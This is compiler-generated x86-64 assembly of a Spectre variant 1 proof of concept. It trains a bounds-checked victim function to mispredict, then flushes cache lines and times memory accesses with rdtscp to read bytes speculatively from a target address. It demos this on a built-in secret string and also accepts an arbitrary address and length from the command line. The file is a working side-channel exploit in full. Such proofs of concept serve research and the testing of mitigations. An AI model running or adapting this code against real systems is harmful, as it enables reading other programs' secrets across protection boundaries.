	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	endbr64
	mov	eax, DWORD PTR array1_size[rip]
	cdqe
	cmp	rax, rdi
	seta	al
	movzx	eax, al
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.globl	leak_data
	.type	leak_data, @function
leak_data:
.LFB5690:
	.cfi_startproc
	endbr64
	mov	eax, DWORD PTR array1_size[rip]
	add	rsi, rdi
	cdqe
	cmp	rsi, rax
	jnb	.L2
	lea	rax, array1[rip]
	movzx	eax, BYTE PTR [rax+rdi]
	sal	eax, 9
	cdqe
	lea	rdx, array2[rip]
	movzx	eax, BYTE PTR [rdx+rax]
	and	BYTE PTR temp[rip], al
.L2:
	ret
	.cfi_endproc
.LFE5690:
	.size	leak_data, .-leak_data
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5691:
	.cfi_startproc
	endbr64
	movzx	esi, BYTE PTR temp1[rip]
	call	leak_data
	ret
	.cfi_endproc
.LFE5691:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5692:
	.cfi_startproc
	endbr64
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	sub	rsp, 56
	.cfi_def_cfa_offset 112
	mov	QWORD PTR 8[rsp], rdi
	mov	QWORD PTR 16[rsp], rsi
	mov	QWORD PTR 24[rsp], rdx
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR 40[rsp], rax
	xor	eax, eax
	mov	DWORD PTR 32[rsp], 0
	lea	rax, results.0[rip]
	lea	rdx, 1024[rax]
.L6:
	mov	DWORD PTR [rax], 0
	add	rax, 4
	cmp	rdx, rax
	jne	.L6
	mov	DWORD PTR [rsp], 999
	lea	r13, array2[rip+131072]
	lea	r12, -131072[r13]
	lea	r14, array1[rip]
	jmp	.L7
.L9:
	movsx	rax, ebx
	imul	rax, rax, 715827883
	shr	rax, 32
	mov	edx, ebx
	sar	edx, 31
	sub	eax, edx
	lea	edx, [rax+rax*2]
	add	edx, edx
	mov	eax, ebx
	sub	eax, edx
	sub	eax, 1
	mov	ax, 0
	cdqe
	mov	rdi, rax
	shr	rdi, 16
	or	rdi, rax
	and	rdi, rbp
	mov	BYTE PTR temp1[rip], 0
	xor	rdi, r15
	call	victim_function
	sub	ebx, 1
	cmp	ebx, -1
	je	.L30
.L11:
	clflush	array1_size[rip]
	mov	DWORD PTR 36[rsp], 0
	mov	eax, DWORD PTR 36[rsp]
	cmp	eax, 99
	jg	.L9
.L10:
	mov	eax, DWORD PTR 36[rsp]
	add	eax, 1
	mov	DWORD PTR 36[rsp], eax
	mov	eax, DWORD PTR 36[rsp]
	cmp	eax, 99
	jle	.L10
	jmp	.L9
.L30:
	mov	ebp, DWORD PTR 4[rsp]
	mov	esi, 13
	lea	r9, results.0[rip]
	jmp	.L13
.L32:
	movsx	r8, r8d
	add	DWORD PTR [r9+r8*4], 1
.L12:
	add	esi, 167
	cmp	esi, 42765
	je	.L31
.L13:
	movzx	r8d, sil
	mov	r10d, r8d
	sal	r10d, 9
	rdtscp
	mov	rdi, rax
	mov	DWORD PTR 32[rsp], ecx
	sal	rdx, 32
	or	rdi, rdx
	movsx	r10, r10d
	movzx	eax, BYTE PTR [r12+r10]
	rdtscp
	mov	DWORD PTR 32[rsp], ecx
	sal	rdx, 32
	or	rax, rdx
	sub	rax, rdi
	cmp	rax, 100
	ja	.L12
	mov	ecx, DWORD PTR array1_size[rip]
	mov	eax, ebp
	cdq
	idiv	ecx
	movsx	rdx, edx
	movzx	eax, BYTE PTR [r14+rdx]
	cmp	eax, r8d
	jne	.L32
	jmp	.L12
.L31:
	mov	eax, 1
	mov	edx, 0
	lea	rsi, results.0[rip]
	jmp	.L14
.L20:
	mov	ebx, edx
	mov	edx, ecx
.L15:
	add	rax, 1
.L14:
	mov	ecx, eax
	cmp	rax, 256
	je	.L33
	test	edx, edx
	js	.L20
	mov	edi, DWORD PTR [rsi+rax*4]
	movsx	r8, edx
	cmp	edi, DWORD PTR [rsi+r8*4]
	jge	.L21
	test	ebx, ebx
	js	.L22
	movsx	r8, ebx
	cmp	edi, DWORD PTR [rsi+r8*4]
	cmovge	ebx, ecx
	jmp	.L15
.L21:
	mov	ebx, edx
	mov	edx, ecx
	jmp	.L15
.L22:
	mov	ebx, ecx
	jmp	.L15
.L33:
	lea	rcx, results.0[rip]
	movsx	rax, ebx
	mov	eax, DWORD PTR [rcx+rax*4]
	movsx	rsi, edx
	mov	ecx, DWORD PTR [rcx+rsi*4]
	lea	esi, 4[rax+rax]
	cmp	esi, ecx
	jl	.L17
	test	eax, eax
	jne	.L23
	cmp	ecx, 2
	je	.L17
.L23:
	sub	DWORD PTR [rsp], 1
	je	.L17
.L7:
	mov	ebp, DWORD PTR [rsp]
	lea	rax, array2[rip]
.L8:
	clflush	[rax]
	add	rax, 512
	cmp	rax, r13
	jne	.L8
	mov	ecx, DWORD PTR array1_size[rip]
	mov	eax, ebp
	cdq
	idiv	ecx
	movsx	r15, edx
	mov	ebx, 29
	mov	rax, QWORD PTR 8[rsp]
	xor	rax, r15
	mov	DWORD PTR 4[rsp], ebp
	mov	rbp, rax
	jmp	.L11
.L17:
	lea	rcx, results.0[rip]
	mov	eax, DWORD PTR results.0[rip]
	xor	eax, DWORD PTR 32[rsp]
	mov	DWORD PTR results.0[rip], eax
	mov	rsi, QWORD PTR 16[rsp]
	mov	BYTE PTR [rsi], dl
	movsx	rdx, edx
	mov	eax, DWORD PTR [rcx+rdx*4]
	mov	rdi, QWORD PTR 24[rsp]
	mov	DWORD PTR [rdi], eax
	mov	BYTE PTR 1[rsi], bl
	movsx	rbx, ebx
	mov	eax, DWORD PTR [rcx+rbx*4]
	mov	DWORD PTR 4[rdi], eax
	mov	rax, QWORD PTR 40[rsp]
	sub	rax, QWORD PTR fs:40
	jne	.L34
	add	rsp, 56
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
.L34:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.8
	.align 8
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB5693:
	.cfi_startproc
	endbr64
	push	r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	push	r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	push	r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	push	r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	push	rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	push	rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	sub	rsp, 72
	.cfi_def_cfa_offset 128
	mov	DWORD PTR 4[rsp], edi
	mov	QWORD PTR 8[rsp], rsi
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR 56[rsp], rax
	xor	eax, eax
	mov	BYTE PTR temp1[rip], 5
.L36:
	mov	rdi, QWORD PTR stdin[rip]
	call	getc@PLT
	cmp	al, 114
	je	.L55
	cmp	al, 10
	je	.L36
	cmp	al, 105
	jne	.L47
	mov	eax, 0
	call	getpid@PLT
	mov	ecx, eax
	lea	rdx, check[rip+33]
	lea	rsi, .LC12[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	jmp	.L36
.L55:
	mov	rdx, QWORD PTR secret[rip]
	mov	rcx, rdx
	lea	rsi, .LC2[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR secret[rip]
	mov	rax, rdi
	lea	rbx, array1[rip]
	sub	rax, rbx
	mov	QWORD PTR 32[rsp], rax
	call	strlen@PLT
	mov	DWORD PTR 28[rsp], eax
	lea	rax, array2[rip]
	lea	rdx, 131072[rax]
.L38:
	mov	BYTE PTR [rax], 1
	add	rax, 1
	cmp	rax, rdx
	jne	.L38
	cmp	DWORD PTR 4[rsp], 3
	je	.L56
.L39:
	mov	edx, DWORD PTR 28[rsp]
	lea	rsi, .LC6[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	eax, DWORD PTR 28[rsp]
	sub	eax, 1
	mov	DWORD PTR 28[rsp], eax
	js	.L36
	mov	ebp, 0
	lea	r15, .LC7[rip]
	lea	r14, .LC0[rip]
	lea	r13, .LC1[rip]
	jmp	.L45
.L56:
	lea	rdx, 32[rsp]
	mov	rbx, QWORD PTR 8[rsp]
	mov	rdi, QWORD PTR 8[rbx]
	lea	rsi, .LC3[rip]
	mov	eax, 0
	call	__isoc99_sscanf@PLT
	lea	rax, array1[rip]
	sub	QWORD PTR 32[rsp], rax
	lea	rdx, 28[rsp]
	mov	rdi, QWORD PTR 16[rbx]
	lea	rsi, .LC4[rip]
	mov	eax, 0
	call	__isoc99_sscanf@PLT
	mov	ecx, DWORD PTR 28[rsp]
	mov	rdx, QWORD PTR 32[rsp]
	lea	rsi, .LC5[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	jmp	.L39
.L43:
	lea	rsi, .LC11[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	eax, DWORD PTR 28[rsp]
	sub	eax, 1
	mov	DWORD PTR 28[rsp], eax
	add	rbp, 1
	test	eax, eax
	js	.L36
.L45:
	mov	rax, QWORD PTR secret[rip]
	movsx	ecx, BYTE PTR [rax+rbp]
	mov	rdx, QWORD PTR 32[rsp]
	mov	rsi, r15
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	mov	rdi, QWORD PTR 32[rsp]
	lea	rax, 1[rdi]
	mov	QWORD PTR 32[rsp], rax
	lea	rdx, 44[rsp]
	lea	rsi, 54[rsp]
	call	readMemoryByte
	mov	r12d, DWORD PTR 44[rsp]
	mov	ebx, DWORD PTR 48[rsp]
	lea	eax, [rbx+rbx]
	cmp	r12d, eax
	mov	rdx, r13
	cmovge	rdx, r14
	lea	rsi, .LC8[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	movzx	edx, BYTE PTR 54[rsp]
	lea	eax, -32[rdx]
	cmp	al, 94
	mov	ecx, 63
	cmovbe	ecx, edx
	movzx	ecx, cl
	movzx	edx, dl
	mov	r8d, r12d
	lea	rsi, .LC9[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	test	ebx, ebx
	jle	.L43
	movzx	edx, BYTE PTR 55[rsp]
	lea	eax, -32[rdx]
	cmp	al, 94
	mov	ecx, 63
	cmovbe	ecx, edx
	movzx	ecx, cl
	movzx	edx, dl
	mov	r8d, ebx
	lea	rsi, .LC10[rip]
	mov	edi, 1
	mov	eax, 0
	call	__printf_chk@PLT
	jmp	.L43
.L47:
	mov	rax, QWORD PTR 56[rsp]
	sub	rax, QWORD PTR fs:40
	jne	.L57
	mov	eax, 0
	add	rsp, 72
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	pop	rbx
	.cfi_def_cfa_offset 48
	pop	rbp
	.cfi_def_cfa_offset 40
	pop	r12
	.cfi_def_cfa_offset 32
	pop	r13
	.cfi_def_cfa_offset 24
	pop	r14
	.cfi_def_cfa_offset 16
	pop	r15
	.cfi_def_cfa_offset 8
	ret
.L57:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5693:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.globl	temp1
	.bss
	.type	temp1, @object
	.size	temp1, 1
temp1:
	.zero	1
	.globl	temp
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.8
	.align 8
.LC13:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC13
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
